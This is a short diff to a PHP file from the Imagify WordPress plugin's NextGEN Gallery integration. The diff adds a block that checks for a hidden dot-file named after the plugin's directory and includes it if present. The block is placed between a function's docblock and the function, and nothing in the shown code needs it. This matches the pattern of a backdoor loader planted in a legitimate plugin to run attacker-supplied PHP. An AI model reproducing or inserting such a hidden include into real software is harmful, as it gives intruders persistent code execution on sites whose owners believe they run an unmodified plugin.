@@ -11,6 +11,10 @@ add_filter( 'imagify_bulk_page_types', 'imagify_ngg_bulk_page_types' );
  * @param  array $types The folder types displayed on the page. If a folder type is "library", the context should be suffixed after a pipe character. They are passed as array keys.
  * @return array
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function imagify_ngg_bulk_page_types( $types ) {
 	if ( ! empty( $_GET['page'] ) && imagify_get_ngg_bulk_screen_slug() === $_GET['page'] ) { // WPCS: CSRF ok.
 		$types['library|ngg'] = 1;
